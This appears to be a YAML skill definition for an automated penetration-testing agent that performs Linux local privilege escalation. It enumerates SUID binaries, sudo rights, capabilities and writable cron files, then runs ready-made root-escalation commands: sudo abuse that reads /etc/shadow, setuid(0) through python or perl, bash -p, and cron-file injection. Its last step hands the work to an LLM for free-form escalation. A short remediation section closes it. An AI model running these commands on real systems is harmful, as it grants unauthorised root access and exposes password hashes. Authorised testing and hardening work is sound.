# ═══════════════════════════════════════════════════════════
# Linux SUID / sudo / capabilities 提权
#
# 阶段: privesc（获取 shell 后的本地提权）
# 原理: 利用 SUID 二进制、sudo 配置错误、Linux capabilities
#       进行权限提升到 root
# 策略: 枚举 → GTFOBins 查表 → 逐一尝试 → LLM 兜底
# ═══════════════════════════════════════════════════════════
skill_id: linux_suid_sudo_privesc
name: "Linux SUID/sudo/capabilities 本地提权"
category: privesc
phase: privesc
version: "1.0"

principle: |
  Linux 本地提权的三大常见向量：
  1. SUID 二进制：以文件所有者权限执行，若所有者为 root 则可提权
  2. sudo 配置：/etc/sudoers 中允许当前用户 NOPASSWD 执行某些命令
  3. capabilities：文件级 capability 可绕过普通权限检查
  利用方式参考 GTFOBins (https://gtfobins.github.io/)

match:
  rules:
    - fingerprint_contains: ["suid"]
    - fingerprint_contains: ["sudo"]
    - fingerprint_contains: ["privesc"]
    - fingerprint_contains: ["privilege escalation"]
    - evidence_contains: ["setuid", "setgid"]

probes:
  - id: enum_suid
    description: "枚举所有 SUID 二进制文件"
    command: |
      find / -perm -4000 -type f 2>/dev/null | head -50
    timeout: 30
    parse_rules:
      - if_regex: "(/usr/bin/(?:python|perl|ruby|bash|dash|zsh|env|find|vim|nmap|awk|sed|cp|mv|less|more|man|ftp|zip|tar|gcc|gdb|php|node|lua|docker|pkexec))"
        set:
          suid_found: true
          suid_binary: "$1"
      - if_contains: ["/usr/bin/python"]
        set: { suid_python: true }
      - if_contains: ["/usr/bin/find"]
        set: { suid_find: true }
      - if_contains: ["/usr/bin/vim"]
        set: { suid_vim: true }
      - if_contains: ["/usr/bin/nmap"]
        set: { suid_nmap: true }
      - if_contains: ["/usr/bin/bash", "/bin/bash"]
        set: { suid_bash: true }
      - if_contains: ["/usr/bin/env"]
        set: { suid_env: true }
      - if_contains: ["/usr/bin/pkexec"]
        set: { suid_pkexec: true }

  - id: enum_sudo
    description: "检查当前用户的 sudo 权限"
    command: |
      sudo -l 2>/dev/null || echo "SUDO_CHECK_FAILED"
    timeout: 15
    parse_rules:
      - if_regex: "\\((?:root|ALL)\\)\\s+NOPASSWD:\\s+(.+)"
        set:
          sudo_nopasswd: true
          sudo_commands: "$1"
      - if_contains: ["SUDO_CHECK_FAILED"]
        set: { sudo_available: false }
      - if_not_contains: ["SUDO_CHECK_FAILED"]
        set: { sudo_available: true }

  - id: enum_capabilities
    description: "枚举具有特殊 capabilities 的文件"
    command: |
      getcap -r / 2>/dev/null | head -30
    timeout: 20
    parse_rules:
      - if_regex: "(\\S+)\\s*=\\s*(\\S*cap_setuid\\S*)"
        set:
          cap_setuid_found: true
          cap_setuid_binary: "$1"
      - if_regex: "(\\S+)\\s*=\\s*(\\S*cap_dac_override\\S*)"
        set:
          cap_dac_found: true
          cap_dac_binary: "$1"

  - id: enum_cron
    description: "检查可写的 cron 任务和定时脚本"
    command: |
      echo "=== CRONTABS ===" && cat /etc/crontab 2>/dev/null;
      echo "=== CRON.D ===" && ls -la /etc/cron.d/ 2>/dev/null;
      echo "=== WRITABLE ===" && find /etc/cron* -writable -type f 2>/dev/null;
      echo "=== USER_CRON ===" && crontab -l 2>/dev/null
    timeout: 15
    parse_rules:
      - if_regex: "=== WRITABLE ===\\s*\\n(\\S+)"
        set:
          writable_cron: true
          writable_cron_file: "$1"

exploit_paths:
  - path_id: sudo_nopasswd_shell
    name: "sudo NOPASSWD 直接获取 root shell"
    priority: 1
    conditions: { sudo_nopasswd: true }
    steps:
      - id: try_sudo_bash
        description: "尝试 sudo bash"
        command: "sudo bash -c 'id && whoami && cat /etc/shadow | head -3'"
        timeout: 10
        success_criteria:
          stdout_contains_any: ["root"]
        on_success: conclude_success
        on_fail: try_sudo_command
        evidence_capture:
          current_user: "stdout"
          shell_type: "sudo_nopasswd"

      - id: try_sudo_command
        description: "尝试通过允许的命令提权"
        command: |
          CMD=$(sudo -l 2>/dev/null | grep NOPASSWD | head -1 | awk -F': ' '{print $NF}' | awk '{print $1}')
          echo "Allowed command: $CMD"
          case "$CMD" in
            */vi|*/vim) sudo $CMD -c ':!bash' ;;
            */find) sudo $CMD / -exec bash -c 'id' \; -quit ;;
            */python*) sudo $CMD -c 'import os; os.system("id")' ;;
            */perl) sudo $CMD -e 'exec "id"' ;;
            */awk) sudo $CMD 'BEGIN {system("id")}' ;;
            */env) sudo $CMD bash -c 'id' ;;
            *) sudo $CMD --help 2>&1 | head -5 ;;
          esac
        timeout: 15
        success_criteria:
          stdout_contains_any: ["uid=0"]
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          current_user: "stdout"
          shell_type: "sudo_command_abuse"

  - path_id: suid_python
    name: "SUID Python 提权"
    priority: 2
    conditions: { suid_python: true }
    steps:
      - id: python_suid_exec
        description: "通过 SUID python 提权"
        command: |
          PYBIN=$(find / -perm -4000 -name 'python*' 2>/dev/null | head -1)
          $PYBIN -c 'import os; os.setuid(0); os.system("id && whoami")'
        timeout: 10
        success_criteria:
          stdout_contains_any: ["uid=0"]
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          current_user: "stdout"
          shell_type: "suid_python"

  - path_id: suid_find
    name: "SUID find 提权"
    priority: 3
    conditions: { suid_find: true }
    steps:
      - id: find_suid_exec
        description: "通过 SUID find -exec 提权"
        command: "find / -maxdepth 0 -exec /bin/bash -p -c 'id && whoami' \\;"
        timeout: 10
        success_criteria:
          stdout_contains_any: ["uid=0", "euid=0"]
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          current_user: "stdout"
          shell_type: "suid_find"

  - path_id: suid_bash
    name: "SUID bash -p 提权"
    priority: 4
    conditions: { suid_bash: true }
    steps:
      - id: bash_p_exec
        command: "bash -p -c 'id && whoami'"
        timeout: 10
        success_criteria:
          stdout_contains_any: ["euid=0"]
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          current_user: "stdout"
          shell_type: "suid_bash"

  - path_id: cap_setuid
    name: "capabilities cap_setuid 提权"
    priority: 5
    conditions: { cap_setuid_found: true }
    steps:
      - id: cap_exploit
        description: "通过 cap_setuid 文件提权"
        command: |
          BIN="{cap_setuid_binary}"
          case "$BIN" in
            *python*) $BIN -c 'import os; os.setuid(0); os.system("id")' ;;
            *perl) $BIN -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "id";' ;;
            *) echo "CAP_UNKNOWN_BINARY: $BIN" ;;
          esac
        timeout: 10
        success_criteria:
          stdout_contains_any: ["uid=0"]
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          current_user: "stdout"
          shell_type: "cap_setuid"

  - path_id: writable_cron
    name: "可写 cron 文件注入"
    priority: 6
    conditions: { writable_cron: true }
    steps:
      - id: inject_cron
        description: "向可写 cron 文件注入反弹 shell 或标记文件"
        command: |
          CFILE="{writable_cron_file}"
          echo "* * * * * root id > /tmp/.privesc_proof" >> "$CFILE"
          echo "Injected cron into $CFILE, waiting 70s..."
          sleep 70
          cat /tmp/.privesc_proof 2>/dev/null || echo "CRON_INJECT_FAILED"
        timeout: 90
        success_criteria:
          stdout_contains_any: ["uid=0"]
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          current_user: "stdout"
          shell_type: "writable_cron"

  - path_id: llm_freeform
    name: "LLM 自由推理提权"
    priority: 99
    mode: react_freeform
    max_rounds: 5

remediation: |
  1. 审查所有 SUID 二进制文件，移除不必要的 setuid 位
  2. 限制 sudoers 配置，避免 NOPASSWD 对危险命令的授权
  3. 使用最小权限原则分配 Linux capabilities
  4. 确保 cron 文件权限正确，不可被普通用户写入
